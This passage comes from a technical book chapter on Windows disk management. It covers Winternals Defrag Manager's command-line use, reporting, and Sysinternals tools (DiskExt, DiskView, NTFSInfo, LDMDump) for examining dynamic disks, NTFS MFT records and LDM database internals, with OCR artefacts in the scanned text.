either a single computer or an entire schedule.You can stop a running analysis or 
defrag from the same menu. 
If you have a schedule that is set up for disconnected clients, your only option is to 
synchronize the schedule.You must do this to push out any changes or new schedules 
to clients that are to be disconnected. If a client that is to receive a particular schedule 
is unreachable during synchronization, Defrag Manager will show a failure and you 
will need to resynchronize either that computer or the entire schedule. 
The Client 
Now that you are performing a defragmentation on all your workstations and 
servers, it would be nice to know what the client experience is like. The way you set 
up your schedules will ultimately affect your user's experience. I have been very 
happy and unless you see/hear that your hard drive is heavy with activity then there 
is a strong chance that your users will never even know the defrag is running. Just 
make sure that if you are running a defrag during the day you use low priority. If 

244 
Chapter 5 9 Disk Management 
you plan to defrag at night you can use a higher priority, but since the workstation is 
unlikely to be doing any other processing, low priority will take the same amount of 
time as another priority. 
Command-Line Defragmentation 
Earlier in this section, I mentioned an executable named defragnt.exe. This exe- 
cutable is a command-line version of Defrag Manager; in fact, you do not even need 
the Defrag Manager Schedule Console to use this executable. To run it you do need 
to have the license file or you can import the Registry key found at 
HKEY_LOCAL_MACHINE\SOFTWARE\Winternals\Licenses, with the license 
key for Defrag Manager to the local machine(s) that will be running the command- 
line deffag program. Just remember to maintain a strict count of where you use this 
for licensing purposes. Winternals officially supports command-line defragmentation, 
as long as you do not exceed your licensing. 
If you do not specify any parameters and the licensing key is present on the local 
machine, Defrag Manager will start a defragmentation of the active drive in the 
command window: 
Usage: defragnt [[-a] 
excludes~le] 
-a 
-f 
-i 
-la 
-p 
[ [-f]] [-l[a] logfile] [-p] [-q] [-t hh:mm] 
[-s [lowlhigh] 
[-w licensefile] 
[volume [volume] ...] 
Analyze only. 
Aggressively consolidate free space (takes longer). 
Write a log file. 
Append to a log file. 
Defrag volumes on different disks in parallel. 
www.syngress.com 
[-x 

Disk Management 9 Chapter 5 
245 
-q 
-t 
-s 
-x 
directory 
Quiet 
Specifies how long defrag should run before being aborted. 
Run the defrag at low or high priority (default is medium). 
Name of file (e.g. -x excludes.txt) containing file and 
defrag exclusions formatted like: 
C : \database. mdb 
C:\Program Files\Email 
-w 
Winternals Defrag Manager license file. 
volume 
Specify the volume letter to defrag or analyze. 
Here are two examples of defragmentation through the command line. The first 
example will defrag the C and D drives, one after another, in low priority and will 
generate a log file to c'\defraglog.log when successful: 
Defragnt-s low-I c:\defraglog.log c: d: 
This command will run an analysis on the C drive and append the results to 
c:\defraglog.log: 
Defragnt -a -s low -la c:\defraglog.log c: 
Reporting 
At this point, you may be curious how successful and effective your defragmenta- 
tions were. This is where reporting comes into play. 
First, you will notice that when you click on a workstation or server, you will 
see the most recent results of any analyses or defrags that were completed either suc- 
cessfully or with an error. The number of events shown is based on how many log 
files you have set the schedule to keep. The schedule keeps four log files by default; if 
you want, you can keep all logs by turning off the option to delete old logs (see 
Figure 5.17).You may want to avoid doing the latter, though, as the logs will build 
up over time. 

246 
Chapter 5 9 Disk Management 
Figure 5.17 Sample Defrag Logging and Graphical Display 
The log in Figure 5.18 shows the post- and predefrag in a graphical representa- 
tion. If you right-click on the line with the date, time, and result, you can view the 
log file that contains all the details of the analysis or defrag. 
One of the key statistics to look for is the average number of fragments per file. 
This number should be as close to 1.00 as possible. Numbers greater than 2 gener- 
ally indicate very high levels of fragmentation and numbers greater than 3 indicate 
extremely high fragmentation. Other helpful numbers are the number of total frag- 
mented files and the percentage of free space you have (you should try to keep the 
latter higher than 20 percent). 
Another way to view statistics concerning how well your enterprise is doing is 
to use Defrag Manager's history feature. This will show you all the log files in one 
window. However, the easiest way to get an overview of how your enterprise is 
defragmenting is through an HTML-generated report. To generate this report simply 
right-click on any schedule and then click View Report. This will open your Web 
browser with an HTML report of the last successful analysis or defrag for each com- 
puter in that schedule. If there are errors more recent than a success for a particular 
computer, they will appear on the report as well. 
www.syngress.com 

Disk Management 9 Chapter 5 
247 
Getting Extended File/Disk 
Information (DiskExt, DiskView, 
NTFSInfo, LDMDump) 
You have learned about the concepts of disk fragmentation and used various tools 
from Sysinternals to combat disk fragmentation. In this section, I will discuss tools 
and techniques you can use to obtain finer details concerning files, volumes, parti- 
tions, and disks.You will learn about different types of volumes that you can create 
through the Logical Disk Manager partitioning scheme, as well as various tools you 
can use to determine disk details such as the size of sectors, clusters, partition layouts, 
and more. 
DiskExt 
Microsoft introduced a new storage concept called dynamic disks in Windows 2000. 
Dynamic disks are partitioned using the Logical Disk Manager (LDM) partitioning 
scheme. LDM partitioning introduced the notion of volumes. The classical Master 

248 
Chapter 5 9 Disk Management 
Boot Record (MBR) partitioning scheme is oriented toward the idea of the creation 
of drives. Disks partitioned using the classic MBR partitioning scheme are basic disks. 
Understanding Basic Disks 
The architecture of x86 systems needs the boot code of the operating system to be 
present in the first sector of the primary hard disk, or the MBR. When the system 
boots up, the BIOS invokes the code contained in the MBR, which subsequently 
loads the operating system. 
In Windows, the MBR also contains a partition table along with the boot code. 
This partition table consists of four entries, which store the locations of four parti- 
tions in the disk. Therefore, this means that a disk can have, at most, four partitions! 
These partitions are considered primary partitions. However, having only four parti- 
tions in a disk is a serious drawback. A special type of partition called an extended 
partition overcomes this limitation. An extended partition allows you to create many 
logical drives inside it.You can think of an extended partition as a container that can 
hold many logical drives. However, a disk can have only one extended partition. 
Therefore, you can have either up to four primary partitions, or up to three primary 
partitions and one extended partition with many logical drives in it. 
Understanding Dynamic Disks 
As stated earlier, Microsoft introduced the concept of dynamic disks in Windows 
2000. Dynamic disks are partitioned using the LDM partitioning scheme. VERITAS 
Software (now part of Symantec) originally developed LDM, which Microsoft 
licensed for its use in Windows. 
Dynamic disks offer various features not found in basic disks.You can use the 
Disk Management MMC snap-in to create new dynamic disks as well as to convert 
basic disks to dynamic disks. The Disk Management MMC snap-in allows you to 
create the following types of volumes in a dynamic disk: 
9 
Simple volume A simple volume use free space on a single disk. 
However, you can extend simple volumes across multiple partitions, if nec- 
essary, to increase the space allocated to a simple volume. 
9 
Spanned volume A spanned volume is a single logical volume, but it is 
physically distributed over multiple partitions that may or may not be on 
the same disk. A spanned volume can span up to 32 free partitions at max- 
imum. An extended simple volume becomes a spanned volume. 
9 
Striped volume A striped volume is a single logical partition that is made 
of a series of identical partitions, with one partition per disk. All the parti- 
www.syngress.com 

Disk Management 9 Chapter 5 
249 
tions in a striped volume must be the same size. A striped volume can have 
up to 32 partitions. A striped volume is also known as a RAID-0 volume. 
Mirrored volume In a mirrored volume, the data in one partition is 
duplicated on an identical partition situated in another disk. Mirrored vol- 
umes are fault-tolerant volumes, because when one of the disks of a 
volume fails, data can be retrieved using the other disk. Mirrored volumes 
are also known as RAID-1 volumes. 
RAID-5 volume A RAID-5 volume is a fault-tolerant version of a 
striped volume.You achieve fault tolerance via parity. Parity is also striped 
along with the data. When a disk that had a portion of RAID-5 volume 
fails, Windows can recover from failure of a single disk (but not more than 
one disk at a time) by re-creating the data based on the parity information 
and the remaining data on other disks. 
Using DiskExt to Determine Extensions 
Apart from using the Disk Management MMC snap-in, there are no built-in tools or 
methods in Windows to find out whether volumes are striped, spanned, or extended 
on multiple disks. Using Sysinternals' DiskExt, you can determine whether volumes 
are extended to multiple disks. DiskExt is a command-line tool; here is its syntax: 
DiskExt.exe 
[[drivel] 
[drive2] 
.... ] 
DiskExt gives the extension information of the specified drive(s). However, if no 
drive letters are specified at the command line, it simply lists information for all the 
volumes present in the system. Code Listing 5.7 shows output that DiskExt gener- 
ated for a specific volume. 
Code Listing 5.7 DiskExt Output Showing Volumes and the Partitions They 
Occupy 
Disk Extent Dumper vl. 0 
Copyright 
(C) 2001 Mark Russinovich 
Sysinternals 
- www.sysinternals.com 
Extents for C: 
Extent 
[i] : 
Disk: 
0 
Offset: 32256 
Length: 2142798336 
Extents for E: 

250 
Chapter 5 9 Disk Management 
Extent 
[I] : 
Disk: 
1 
Offset: 32256 
Length: 1603897344 
Extent 
[2]: 
Disk: 
2 
Offset: 838893056 
Length: 765036544 
Extents for F: 
Extent 
[I] : 
Disk: 
2 
Offset: 32256 
Length: 838860800 
You can observe from the output in Code Listing 5.7 that volume C is on Disk 
0, the primary hard disk (IDE 0:0). Volume E is spanned over two hard disks indi- 
cated as Disk 1 (IDE 0:1) and Disk 2 (IDE 1:0). Therefore, it has two extensions. 
Finally, volume F is on Disk 2. The term Offset indicates the distance of the start of 
the volume from the start of the disk in terms of bytes, and Length indicates the size 
of the volume in terms of bytes.You can see that on Disk 2, volume F occupies up 
to 838860800 bytes (roughly 840 MB) and volume E is occupying the subsequent 
space, as its offset starts from 838893056. 
DiskView 
We already used DiskView to find fragmented files in a volume. Let's see how we 
can use DiskView to find extended information, such as the number of clusters a file 
occupies, its number of fragments, and so on.You can obtain a brief overview of the 
selected volume by choosing File ] Statistics. Selecting this option will give you 
an idea of the total number of files present in the volume, the total number of frag- 
ments, and the percentage of free space. 
Finding a File's Cluster Properties 
Double-clicking on any part of the upper map in DiskView brings up the Cluster 
Properties window. Figure 5.18 shows an example of DiskView illustrating a file's 
cluster properties. 

Disk Management 9 Chapter 5 
251 
Figure 5.18 Cluster Properties of a File Shown by DiskView 
The Cluster Properties window provides the following statistics: 
9 
Cluster on Disk This represents the offset address of the currently 
selected cluster. 
9 
File Path This shows the filename that occupies the currently selected 
cluster. 
9 
File Cluster File clusters are the clusters that a file occupies. File clusters 
have relative offset addresses. The first cluster of a file has a relative offset of 
zero, whereas its disk offset address may be anything else. DiskView shows 
the relative offset of the selected cluster, along with the total clusters occu- 
pied by the file. 
9 
File Fragments As you can see in Figure 5.7, this section is divided into 
two parts: File Clusters and Disk Clusters. File Clusters shows the rela- 
tive offset of the fragments, and Disk Clusters shows the fragments' corre- 
sponding disk offset addresses. 
Finding the MFT Zone 
Similar to the File Allocation Table in FAT file systems, NTFS uses a centralized 
depository called the Master File Table (MFT). NTFS reserves some portion of the 
disk space to accommodate for variations in the size of this MFT, known as the 
MFT Zone. We shall see the practical details of this shortly. For now, let's see how we 
can locate the MFT Zone through DiskView. 
DiskView shows clusters present in the MFT Zone in fluorescent green, in the 
upper half of the graphical map, as shown in Figure 5.19. Double-clicking in any 
part of this area shows the total clusters that the MFT Zone occupies. 

252 
Chapter 5 9 Disk Management 
Figure 5.19 Viewing the MFT Zone Using DiskView 
NTFSInfo 
You have just learned about the tools you can use to discover more information 
about the partitions occupied by volumes, and you learned how to determine the 
physical location of files on a disk. If you need to know advanced disk-space alloca- 
tion information, such as the size of each cluster, the total number of clusters in a 
volume, the total sectors per cluster, and so on, you have to use Sysinternals' 
NTFSInfo.Along with this, NTFSInfo also provides us the niceties of NTFS MFT 
structure. However, in this section of the chapter we shall concentrate only on ana- 
lyzing the disk-space allocation information presented by NTFSInfo. 
NTFSInfo is a command-line tool and takes the drive letter as an argument; here 
is its syntax: 
NTFSInfo.exe <drive letter> 
Code Listing 5.8 shows the output that NTFSInfo generates with C specified as 
the drive letter. 

Disk Management 9 Chapter 5 
253 
Code Listing 5.8 Example NTFSInfo Output 
NTFS 
Information 
Dump 
Copyright (C) 1997 Mark Russinovich 
http: //www. ntinternals, com 
Volume 
Size 
Volume 
size 
Total sectors 
Total 
clusters 
Free clusters 
Free space 
: 2043 MB 
: 4185152 
: 1046288 
: 464515 
: 907 MB 
(44% of drive) 
Allocation Size 
Bytes per sector 
: 512 
Bytes per cluster 
: 2048 
Bytes per MFT record 
: 1024 
Clusters 
per MFT record: 
0 
MFT Information 
MFT size 
MFT start 
cluster 
MFT zone clusters 
MFT zone size 
MFT mirror 
start 
: 8 MB 
(0% of drive) 
: 348762 
: 352832 
- 479552 
: 247 MB 
(12% of drive) 
: 523144 
Meta-Data 
~les 
Let's discuss the information in the first two sections: Volume Size and 
Allocation Size. Volume Size reveals volume-related information, such as the size (in 
megabytes), total number of sectors, total number of clusters, number of free clusters, 
and amount of free space (in megabytes) in the specified volume. All of this informa- 
tion is relatively self-explanatory and easy to understand. The Allocation Size section 
shows the fundamental aspects of space allocation, such as bytes per sector, bytes per 
cluster, bytes per MFT record, and clusters per MFT record. From the example 

254 
Chapter 5 9 Disk Management 
NTFSInfo output shown here, you can see that each sector occupies 512 bytes, each 
cluster occupies 2,048 bytes, and each cluster is made of four sectors. The next 
NTFSInfo entries are related to the MFT, which is the NTFS counterpart of the 
File Allocation Table in the FAT file system. We will see this in detail in the next 
section. 
LDMDump 
From the inception of the LDM partitioning scheme, it has been very easy to create 
multipartitioned volumes.You have seen how you can use DiskExt to learn about 
the partitions occupied by volumes. Now you will use the LDMDump tool to learn 
more about the partitioning scheme and partition layouts. 
The primary use of LDMDump is to view the inner workings of LDM 
databases.You will see what the LDM database is and how it looks in the next sec- 
tion. Along with the contents of the LDM database, LDMDump summarizes the 
partitions and volumes present in the system at the end of its output. We will con- 
centrate on this part and learn how to analyze this data. 
LDMDump is a command-line tool. It takes the disk identifier as the argument 
and displays the LDM database present in that disk. Here is its syntax: 
LDMdump. exe [/d#] 
Here, d# indicates the disk identifier. A disk identifier starts from zero~for 
example, dO represents the primary disk, dl the secondary disk, and so on. 
LDMDump output is quite extensive, and hence, it would be easy to redirect the 
output to a text file so that you can study it later. To do this, you use this command: 
LDMdump.eKe 
[/d#] > Output.txt 
Executing this command will pipe the LDMDump output to the Output.txt 
text file, which will be present in the same directory as the one holding LDMDump. 
Let's examine the different sections of the LDMDump output. 
Analyzing the Partition Layout Using LDMDump 
LDMDump gives information about the total number of disks in a system, the parti- 
tions in the disks, and their size. It provides this information under the PARTITION 
LAYOUT heading in the LDMDump output. Code Listing 5.9 shows sample parti- 
tion layout information. 

Disk Management 9 Chapter 5 
255 
Code Listing 5.9 An Extract of LDMDump Output Showing Partition 
Layouts 
PARTITION LAYOUT: 
Disk Diskl: 
Diskl-01 Offset: 0x00000000 Length: 0x003FDC41 
(2043 MB) 
Disk Disk2: 
Disk2-01 Offset: 0x00000000 Length: 0x001F4000 
(i000 MB) 
Disk2-02 Offset: 0x001F4000 Length: 0x00108CC4 
(529 MB) 
Disk Disk3: 
Disk3-01 Offset: 0x00000000 Length: 0x001F4000 
(i000 MB) 
Disk3-02 Offset: 0x001F4000 Length: 0x00096000 
(300 MB) 
You can see that three hard disks are present, called Disk 1, Disk2, and Disk3. 
Disk1 has only one partition, starting from the cluster offset OxO0000000, and of 
length OxOO3FDC41, which yields a size of 2,043 MB. Disk2 has two partitions, 
indicated by Disk2-01 and Disk2-02, of size 1,000 MB and 529 MB, respectively. 
Note that the second partition starts from the end of the first partition. Similarly, 
Disk3 also has two partitions designated as Disk3-01 and Disk3-02 of size 1,000 MB 
and 300 MB, respectively. Therefore, for a disk indicated by DiskX, where X is a 
number, its partitions are represented as DiskX-01, DiskX-02, DiskX-03, and so on. 
Finding Volume Information Using LDMDump 
Now that you know how to analyze the partition layout in the LDMDump output, 
let's look at the final section ofLDMDump's output~namely, the VOLUME DEFI- 
NITIONS section. Code Listing 5.10 shows an extract of LDMDump output on 
the same system used before. 
Code Listing 5.10 An Extract of LDMDump Output Showing Volumes 
VOLUME DEFINITIONS: 
Volumel Size: 0x003FDC41 
(2043 MB) 
Volumel-01 - 
Diskl-01 
VolumeOffset: 
0x00000000 Offset: 0x00000000 Length: 
0x003FDC41 
Volume2 Size: 0x001F4000 
(I000 MB) 

256 
Chapter 5 9 Disk Management 
Volume2-01 
- 
Disk2-01 
VolumeOffset: 
0x00000000 Offset: 0x00000000 Length: 
0x001F4000 
Volume3 Size: 0x00392CC4 
(1829 MB) 
Volume3-01 
- 
Disk2-02 
VolumeOffset: 
0x00000000 Offset: 0x001F4000 Length: 
0x00108CC4 
0x001F4000 
0x00096000 
Disk3-01 
Disk3-02 
VolumeOffset: 
0x00108CC4 Offset: 0x00000000 Length: 
VolumeOffset: 
0x002FCCC4 Offset: 0x001F4000 Length: 
Code Listing 5.10 shows that there are three volumes in this system: Volume 1, 
Volume2, and Volume3. Volume sizes are indicated in terms of both total clusters and 
megabytes. Multiplying the cluster count and the bytes per cluster gives you the 
actual size in bytes. 
We know that a volume can occupy multiple partitions; hence, LDM uses an 
entity known as Component to provide a connection between a volume and the par- 
titions it occupies. In this example, the Component for Volume I is represented as 
Volume1-01. Volume I occupies only one partition, Disk 1-01. We can see three entries 
in front of Disk 1-01~namely, VolumeOffset, Offset, and Length. VolumeOffset is the rel- 
ative cluster offset from which the volume starts on a disk, whereas Offset is the 
cluster offset from which the actual partition begins on the disk. Finally, Length is the 
partition size specified in terms of total clusters. The second volume, Volume2, occu- 
pies partition 1, on Disk 2, with Volume2-01 as its Component. Finally, Volume3 
spreads over three partitions on different disks, occupying partition 2 on Disk2 and 
partitions 1 and 2 on Disk3. In this section of the code output in Code Listing 5.10, 
we can see that the VolumeOffset and the actual Offset differ from each other. 
VolumeOffset is actually computed as follows: 
Current VolumeOffset 
= Previous VolumeOffset 
+ Length 

Disk Management 9 Chapter 5 
257 
All offsets and lengths are in terms of clusters.You can apply and verify the pre- 
ceding equation to the partitions of Volume3 in the example shown in Code 
Listing 5.10. 
Disk Volume Management 
(NTFSlnfo, VolumelD, LDMDump) 
In the previous section, you saw how to obtain exhaustive information concerning 
files, volumes, and disks. In this section, you will go a bit deeper and learn how to 
analyze the internal structures of the NTFS file system and LDM. Here, you will 
learn how to use NTFSInfo and LDMDump to get additional information about 
the aforementioned areas. 
Later, I will discuss the concept of Volume Serial Numbers, such as how they are 
derived and how you can change them.You'll learn how to use the VolumelD tool 
to change the Volume Serial Numbers as per your requirements, and see some of the 
scenarios where you can use it. 
Getting Extended NTFS Information 
The NTFS file system is radically different from the FAT file system, even though it 
still uses the hierarchical file structure that's used in the FAT file system. NTFS vol- 
umes are divided into two parts, one for data storage and another for storing the 
file-system-related files. Similar to the File Allocation Table in FAT file systems, 
NTFS maintains a centralized repository for all the files and directories present in 
the hard disk. As mentioned earlier, this is known as the Master File Table (MFT). 
The number of files and folders can increase or decrease in the disk over time, and 
the MFT can grow or shrink accordingly. To accommodate this variation in MFT 
size NTFS reserves some amount of free disk space next to the MFT. As noted ear- 
lier, this buffer area is called the MFT Zone. The MFT Zone is physically situated 
alongside the MFT and it occupies 12 percent of the total volume space. The MFT 
Zone ensures that the MFT is not fragmented, which is undesirable. The remaining 
space is used to store actual files and folders. 
The MFT consists of a set of records of a fixed size, generally around 1 KB each. 
Each file and folder in the volume will have a record in the MFT. The file system 
uses the first 16 records in the MFT to store special information. These special 
records, also called metadatafiles, are created when the disk is formatted. They are as 
follows: 

258 
Chapter 5 9 Disk Management 
9 
$Mft The MFT stores information about itself in the first record of the 
table, indicated by SMft. 
9 
$MftMirr $MftMirr is a duplicate image of the first four records in the 
SMft record. The file system uses this record in case the SMft record 
becomes corrupt. 
9 
$LogFile This record maintains a list of transactions.A transaction is an I/O 
operation that results in a change in any of these 16 special records. 
9 
$Volume This record contains information about the current volume, 
such as volume label and volume ID. 
9 
$AttrDef This record contains descriptions of file attributes that NTFS 
uses. I will discuss some of these attributes shortly. 
9 
\ The \ record, read as the Root record, contains a pointer to the volume's 
root directory. 
9 
$Bitmap This record contains information about which clusters are 
already in use in the volume. 
9 
$Boot This record contains information that is required to mount the 
volume at boot-up, as well as additional bootstrap programs if the volume is 
flagged as bootable. 
9 
SBadClus This record contains information about the bad clusters in the 
volume. 
9 
$Seeure This record contains unique security descriptors for each file and 
directory in the volume. 
9 
$Upcase This record converts the lowercase characters to their equivalent 
Unicode uppercase characters. NTFS is completely Unicode compatible. 
9 
SExtend This record contains information about additional features that 
NTFS supports, such as quotas. 
The remaining four records are reserved for future use. 
NTFS treats everything as a file, even a directory. NTFS views a file as a collec- 
tion of attributes rather than as binary data. NTFS provides many attributes to define 
the type of a file, its contents, and so on. In the perspective of NTFS, a directory is 
simply a file that uses an Index attribute. An Index attribute contains the pointers to 
the files contained within the directory. Each file and directory will have a record in 
the MFT. Figure 5.20 shows an example of an MFT file record. 

Disk Management 9 Chapter 5 
259 
Figure 5.20 Representation 
of an MFT Record 
Header Standard Information 
Filename 
Data Attribute 
Security Descriptor 
Other Attributes 
, 
I 
I 
I 
I 
I 
Figure 5.9 shows that each record has five named fields: Header, Standard 
Information, Filename, Data Attribute, and Security Descriptor. Here is a description 
of each field: 
9 
Header NTFS assigns a sequence number for each file and this informa- 
tion is stored in the header part of the record. 
9 
Standard Information This field is used to store some standard file 
attributes, such as "Read Only, ..... 
~xrcnlve," "and .... 
ralooen."" " In addition, 
NTFS stores information such as the date and time the file was created. 
9 
Filename NTFS stores the filename in this field. Each file can have mul- 
tiple filename attributes. For example, NTFS uses Unicode filenames and 
supports names of up to 255 characters. MS-DOS filenames are based on 
8.3 formats~that is, 8 character names and a 3-character extension. So, 
both of these names are stored in the MFT record's Filename attribute 
field. 
9 
Data Attribute Even the actual file data is treated as an attribute and is 
stored in this field. If the file is smaller than the size of the MFT record, 
NTFS stores the actual data in this field. For larger files, data is stored in 
the disk space outside of the MFT and the MFT Zone, and a pointer to 
those data blocks is stored in the record's Data Attribute field. 
www.syngress.com 

260 
Chapter 5 9 Disk Management 
Security Descriptor NTFS is an improvement over older file systems in 
that it provides powerful security features. NTFS implements security for 
files and directories using concepts such as ownership, access rights, and 
permissions. All of this security-related information is stored in the record's 
Security Descriptor attribute. 
NTFS provides many more attributes in addition to the ones just discussed. 
However, not all of these need to be present in every file. 
Using NTFSInfo to Get MFT Details 
By using the NTFSInfo tool, you can obtain the information related to MFT and to 
metadata files. We already used NTFSInfo earlier to determine disk use and alloca- 
tion information. Here, using the same tool, you can also obtain MFT-related infor- 
mation. Consider the earlier example, shown here in Code Listing 5.11. 
Code Listing 5.11 Example NTFSInfo Output 
NTFS Information Dump 
Copyright 
(C) 1997 Mark Russinovich 
http://www.ntinternals, com 
Volume Size 
Volume size 
Total sectors 
Total clusters 
Free clusters 
Free space 
: 2043 MB 
: 4185152 
: 1046288 
: 464515 
: 907 MB (44% of drive) 
Allocation 
Size 
Bytes per sector 
: 512 
Bytes per cluster 
: 2048 
Bytes per MFT record 
: 1024 
Clusters 
per MFT record: 0 
MFT Information 
MFT size 
: 8 MB (0% of drive) 

Disk Management 9 Chapter 5 
261 
MFT 
start 
cluster 
MFT 
zone 
clusters 
MFT 
zone 
size 
MFT mirror 
start 
: 348762 
: 352832 
- 479552 
: 247 MB 
(12% of drive) 
: 523144 
Meta-Data 
~les 
Let's look at the MFT Information section of the output. In this example, the 
MFT is occupying 8 MB; the physical location of the start of the MFT is at cluster 
348762. The MFT Zone, which is space that's reserved for the growth of MFT, starts 
from cluster 352832 and ends at 479552. We know that the MFT Zone occupies 12 
percent of the total volume size, or 12 percent of 2,043 MB, which is actually the 
total disk space, or approximately 247 MB. In addition, the backup of MFT, known as 
the MFT mirror, is located at cluster blocks starting from cluster 523144. Bytes per 
MFT record, under the Allocation Size section, gives the size of each record in the 
MFT.You can see that each record occupies 1,024 bytes~that is, 1 KB. In our 
example, two MFT records are stored in a cluster; each MFT record theoretically 
uses half a cluster. However, NTFSInfo does not depict fractional values, and hence, 
it shows Clusters per MFT record as 0. If the clusters were 1 KB each, NTFSInfo 
would have shown Clusters per MFT record as 1. 
Metadata Files and NTFSInfo 
You may be wondering why NTFSInfo is not displaying the metadata files that are 
present in the volume. This has to do with the version of NTFS in the system. 
NTFS5, available since Windows 2000, uses a different methodology to handle these 
metadata files, which is not familiar to NTFSInfo. Therefore, NTFSInfo cannot read 
the metadata files in systems that use NTFS5. 
Investigating the Internals 
of the Logical Disk Manager 
You've seen the types of volumes that can be created on a dynamic disk. Now let's 
see how this partitioning scheme actually works. All of the dynamic disks in a system 
collectively form a disk group. Each dynamic disk in a disk group stores information 
about itself and all other dynamic disks in a database known as the LDM database. 
The LDM database is stored in a 1MB space reserved at the end of each dynamic 
disk.An LDM database consists of five sections: 

262 
Chapter 5 9 Disk Management 
9 
Private Header In an LDM partitioning scheme, a 128-bit number called 
the globally unique identifier (GUID) identifies each disk and disk group. 
The Private Header field stores the GUID of the disk on which it is pre- 
sent, along with the GUID and name of the disk. As the name indicates, 
data in the Private Header is private to a disk. 
9 Table of Contents This section of the LDM database stores information 
concerning the layout of whole database. 
9 Database Records Database Records are the areas where the actual 
information regarding the partitions on the disk, volumes on the disk, and 
the other dynamic disks in the system is stored. The Database Records sec- 
tion consists of 128-byte records within which previously mentioned infor- 
mation is stored. There can be four types of records: Partition, Volume, 
Component, and Disk. Partition entries in the database record store the 
description of partitions created in the disk. A Volume entry stores the 
GUID, total size, and drive letter of the volume.You learned that a volume 
can span multiple partitions; the information about the partitions occupied 
by a volume is stored in the Component entry in the Database Records 
section. Finally, the Disk entry stores the GUID of the dynamic disk. 
9 Transactional Log Area This section is dedicated to storing a backup of 
the original database records, as the records are modified. LDM uses this 
backup to restore the database to the original fail-safe state, after a system 
crash. 
9 
Private Header Mirror The last section of the LDM database is actually 
a copy of the Private Header. 
Figure 5.21 shows a schematic representation of an LDM database. 

Disk Management 9 Chapter 5 
263 
Figure 5.21 Representation of an LDM Database 
Private Header Table of Contents 
Database Records 
! 
I 
Transactional Log Area 
I ~ 
Private 
Header 
Mirror 
Looking inside the LDM Database 
Windows does not provide any built-in tools to look into the actual contents of the 
LDM database. In this section, I'll describe how you can analyze the LDM database 
using Sysinternals' LDMDump command-line tool. 
LDMDump shows the entries in the Private Header, Table Of Contents, and 
Database Records sections, as well as a summary of all volumes present in the 
system.You already learned that LDMDump takes the disk identifier of a dynamic 
disk as the argument and displays the contents of the LDM database in its output. 
Recall the syntax for this tool: 
LDMdump. exe [/d#] 
OF 
LDMdump.exe 
[/d#] > Output.txt 
As the output will be too large to analyze all at once, let's examine it in sections. 
Analyzing the Private Header 
Code Listing 5.12 shows an excerpt from the output of LDMDump, depicting the 
Private Header section. 
www.syngress.com 

264 
Chapter 5 9 Disk Management 
Code Listing 5.12 The Private Header Section of the LDM Database 
Depicted by LDMDump 
PRIVATE HEAD: 
Signature 
Version 
Disk Id 
Host Id 
Disk Group Id 
Disk Group Name 
: PRIVHEAD 
: 2.11 
: 31311e0e-c3a7-4532-86f2-fce390075ad7 
: Ib77da20-c717-11d0-a5be-00a0c91db73c 
: 3ebf4717-aaa3-4461-af6b-a0365b9dee27 
: VmboxDg0 
Logical disk start: 3F 
Logical disk size: 3FF7BI 
(2046 MB) 
Configuration start: 3FF7F0 
Configuration size: 800 (I MB) 
Number of TOCs 
: 1 
TOC size 
: 7FE (1023 KB) 
Number of Configs: 1 
Config size 
: 5AC (726 KB) 
Number of Logs 
: 1 
Log size 
: DC (ii0 KB) 
The Disk Id entry shows the GUID of the hard disk specified as the argument 
to LDMDump.The Host Id entry shows the host machine's GUID. Disk Group Id is 
the GUID of the disk group, and Disk Group Name is the actual name of the disk 
group. The disk group name is constructed by concatenating the system name, 
VmBox in this example, with DgO. The next two entries, Logical disk start and Logical 
disk size, describe the cluster offset of the partition on the disk specified, as well as 
the size of this partition, respectively. 

Disk Management 9 Chapter 5 
265 
Analyzing the Table of Contents 
The second section of the LDM database is the Table of Contents. Code Listing 5.13 
depicts an extract from the output of LDMDump showing the Table of Contents 
data. 
Code Listing 5.13 The Table of Contents Section Depicted by LDMDump 
TOC 0: 
Signature 
: TOCBLOCK 
Sequence 
: 0xlF 
Config bitmap start: 
0xll 
Config bitmap size: 0x5AC 
Log bitmap start 
: 0x5BD 
Log bitmap size 
: 0xDC 
The Table of Contents section contains information about two bitmaps. One is 
the Config bitmap, which is actually the section of the LDM database that contains 
database records, and the other is the Log bitmap, which is the section of the LDM 
database that contains the transactional log. The start addresses are relative to the start 
of the LDM database and the sizes are in terms of sectors. Hence, the sizes of the 
Config bitmap (database records) and the Log bitmap (transactional log) are 726 KB 
and 110 KB, because each sector is 512 bytes. 
Analyzing Database Records 
Database Records is the third section in the LDM database. A header known as 
Database Header precedes the actual 128-byte records.The Database Header stores 
information such as header size, database record size, the disk group GUID, and so 
on.You can see an extract from the output of LDMDump showing the Database 
Header in Code Listing 5.14. 
Code Listing 5.14 The Database Header As Depicted by LDMDump 
VMDB DATABASE 
HEADER: 
Signature 
Flags 
Timestamp 
Block size 
Header size 
Version 
: VMDB 
: 0xl00 
: 4/9/2006 
5:09 PM 
: 128 bytes 
: 512 bytes 
: 4/10 

266 
Chapter 5 9 Disk Management 
Number 
of VBLKs 
: 0xl6B0 
Disk Group Name 
: VmboxDg0 
Disk Group 
Id 
: 3ebf4717-aaa3-4461-af6b-a0365b9dee27 
Committed Sequence: 
0x465 
???please note typo f~. 
Pending Sequence 
: 0x465 
The Database Header's signature is VMDB. The Timestamp entry stores the time 
when Windows or any other tool last accessed or changed the LDM database. 
Windows accesses the LDM database during every boot-up. The Disk Management 
MMC snap-in also accesses the LDM database whenever it is invoked. The next two 
entries, Block size and Header size, provide information regarding the size of a 
database record and the size of the header, in bytes. The Database Header block also 
contains the Disk Group Name and the Disk Group Id, which are identical to those in 
the Private Header section. 
Continuing with our example, let's see the database records as depicted by 
LDMDump. The extract shown in Code Listing 5.15 is from a system that has a 
2GB simple volume. 
Code Listing 5.15 Database Records of an LDM Database Depicted by 
LDMDump 
VBLK DATABASE: 
0x000004: 
[000004] 
<Disk> 
Name 
: Diskl 
Object 
Id 
: 0x0403 
Disk Id 
: 31311e0e-c3a7-4532-86f2-fce390075ad7 
0x000005: 
[000018] 
<DiskGroup> 
Name 
: VmboxDg0 
Object 
Id 
: 0x0401 
GUID 
: 3ebf4717-aaa3-4461-af6b-a0365b9dee27 
0x000007: 
[000001] 
<Volume> 
Name 
: Volumel 
Object 
Id 
: 0x0406 
Volume 
state: ACTIVE 
Size 
: 0x003FDC41 
(2043 MB) 
GUID 
: lllb2232-c448-11da-alb0-806d6172696f 

Disk Management 9 Chapter 5 
267 
Drive Hint: C: 
0x000008: 
[000003] 
<Component> 
Name 
: Volumel-01 
Object 
Id 
: 0x0408 
Parent 
Id 
: 0x0406 
0x000009: 
[000007] 
<Partition> 
Name 
Object 
Id 
